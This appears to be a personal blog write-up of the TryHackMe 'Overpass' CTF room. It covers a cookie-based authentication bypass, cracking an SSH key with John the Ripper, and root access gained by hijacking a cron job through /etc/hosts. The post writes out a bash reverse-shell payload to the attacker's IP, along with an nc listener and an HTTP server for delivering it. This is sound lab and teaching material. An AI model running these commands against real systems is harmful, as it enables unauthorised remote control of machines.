---
layout: post
title: TryHackMe writeup - Overpass
author: Lorentz Vedeler
date: 2020-07-21
tags:   
    - TryHackMe
---

Here's how I rooted the room overpass on [tryhackme.com][1]

## user.txt

### Red herring #1 - Looking for sensitive data exposure
Just browsing to the IP reveals a product page for a password manager. We can find the source for the password manager which reveals that it is not secure at all - it's using a simple caeasar cipher with 47 rotations. The passwords are saved to a .overpass file in the users home directory. I actually spent a lot of time looking for one of these files exposed on the server but could not find any.

### Red herring #2 - Looking for injection
After running gobuster for a short while it revealed that an additional login page for admins could be reached. Reading the hint on tryhackme I started looking for injections. I tried many different payloads for sql, no-sql, command injection etc in the username/password fields, but could not find any that would work.

### Red herring #3 - Looking for XXE and insecure deserialization
Checking out the javascript code for login.js we can see that it's using ajax to post the credentials to an api endpoint. The comment that "body data type must match "Content-Type" header" made me think this could be an endpoint that would accept different content types. So I tried to modify the request and send credentials a few different xml and json formats, but all returned 400 Bad request.

```javascript
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
``` 

### Finally - Broken authentication

We can see from the javascript above that a successful login sets the cookie `SessionToken` with the result from the request. I had incorrectly assumed that it would be a JWT token, and had been looking for ways to register a new user to see if I could find some weakness in the tokens. A desperate try was to just set this token to the username I wanted to login with. First I tried setting it to 'admin' and refresh the page. No luck. Then I tried with 'administrator'. Refresh... And behold: The administrator page. It contains a private ssh-key meant for the user james. The key is encrypted, but the text on the page suggests it should be easily crackable, and running john the ripper on it with the rockyou password list cracks it almost instantly even on my old laptop.

> edit: after reading other writeups I have no idea why it didn't work to set the cookie at first try, perhaps I didn't actually save the cookie with changed value. Apperantly it should accept any value in the cookie.

1. Save the key to id_rsa in your working directory.
2. `/usr/share/john/ssh2john.py id_rsa > id_rsa_hash`
3. `john --wordlist=/opt/wordlists/rockyou.txt --format=SSH id_rsa_hash`
4. `ssh -i id_rsa james@<IP>` 

## root.txt
...And we're in. I uploaded linpeas to the server and ran it from james home directory. It shows us a few interesting things:

1. A cron job running as root that downloads a buildscript from overpass.thm and pipes it to bash
2. We have write access to /etc/hosts

The plan is simple: we will serve our own malicious buildscript containing a reverse shell payload, spin up our listener, add an entry for overpass.thm domain with our own IP to the /etc/hosts file and wait untill the cron job executes.

``` bash
mkdir -p downloads/src
``` 
save the script below to `downloads/src/buildscript.sh`
``` bash
bash -i >& /dev/tcp/<your ip>/4444 0>&1
```

Then run the following on your own machine:
``` bash
sudo python3 -m http.server 80
# In another terminal: 
nc -lnvp 4444
```

wait for a few moments... and boom! we are root.

[1]: https://tryhackme.com